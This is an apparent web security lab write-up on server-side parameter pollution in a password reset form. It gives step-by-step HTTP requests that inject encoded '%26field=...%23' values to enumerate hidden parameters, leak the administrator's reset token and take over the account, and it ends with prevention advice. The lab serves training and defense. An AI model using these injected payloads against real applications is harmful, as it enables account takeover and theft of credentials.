# Exploiting server-side parameter pollution in a query string

**Lab:** Exploiting server-side parameter pollution in a query string
---

## Lab Description

This lab is vulnerable to server-side parameter pollution in the password reset functionality. The application allows users to submit a username to retrieve password reset information.

To solve the lab, discover how the backend processes additional query parameters and use the vulnerability to obtain the administrator's password reset token. Then reset the administrator's password and log in.

---

## Objective

- Identify server-side parameter pollution.
- Discover hidden backend parameters.
- Obtain the administrator's password reset token.
- Reset the administrator's password.
- Log in as `administrator`.

---

## Steps

### 1. Intercept the password reset request

Navigate to **Forgot Password** and submit the username:

```
administrator
```

Intercept the request in Burp Suite.

Example:

```http
POST /forgot-password HTTP/2

csrf=<csrf_token>&username=administrator
```

---

### 2. Append a URL-encoded fragment

Append an encoded `#` (`%23`) after the username.

```http
username=administrator%23
```

Response:

```json
{
    "error":"Field not specified."
}
```

This indicates the backend is parsing the request differently from the frontend.

---

### 3. Test for hidden parameters

Append an additional parameter after the encoded fragment.

```http
username=administrator%26field=email%23
```

Response:

```json
{
    "type":"email",
    "result":"*****@normal-user.net"
}
```

This confirms:

- The backend accepts a hidden `field` parameter.
- Server-side parameter pollution exists.

---

### 4. Brute-force the `field` parameter

Send the request to Intruder.

Payload position:

```http
username=administrator%26field=§value§%23
```

Use a wordlist containing common parameter names such as:

```
id
action
page
name
password
url
email
type
token
reset_token
```

---

### 5. Inspect the JavaScript

Browse to:

```
/static/js/forgotPassword.js
```

The JavaScript reveals that the password reset process uses a parameter named:

```
reset_token
```

---

### 6. Request the reset token

Modify the request:

```http
POST /forgot-password HTTP/2

csrf=<csrf_token>&username=administrator%26field=reset_token%23
```

Response:

```json
{
    "type":"reset_token",
    "result":"<administrator_reset_token>"
}
```

The administrator's password reset token is disclosed.

---

### 7. Reset the administrator password

Visit:

```
/forgot-password?reset_token=<administrator_reset_token>
```

Set a new password.

Example:

```
Password123!
```

---

### 8. Login

Authenticate using:

```
Username: administrator
Password: Password123!
```

The lab is solved.

---

# Vulnerability

The application appends user-controlled input to a backend request without proper validation.

By injecting:

```
%26field=<parameter>%23
```

the attacker adds arbitrary backend parameters.

This allows enumeration of hidden parameters and eventually disclosure of sensitive values such as the administrator's password reset token.

---

# Impact

An attacker can:

- Discover hidden backend parameters.
- Read unintended server-side values.
- Obtain password reset tokens.
- Reset arbitrary user passwords.
- Fully compromise administrator accounts.

---

# Prevention

- Never concatenate user input into server-side requests.
- Reject unexpected parameters.
- Use strict allowlists for accepted parameter names.
- Validate requests on the server instead of trusting frontend validation.
- Avoid exposing internal parameter names through API responses or JavaScript.
- Generate password reset tokens only after proper authorization and never disclose them through API responses.

---

## Key Takeaways

- URL-encoded delimiters (`%26`, `%23`) can alter backend request parsing.
- Backend and frontend may parse parameters differently.
- Hidden parameters can often be discovered through fuzzing.
- Client-side JavaScript may reveal internal API parameter names.
- Server-side parameter pollution can lead to complete account takeover.
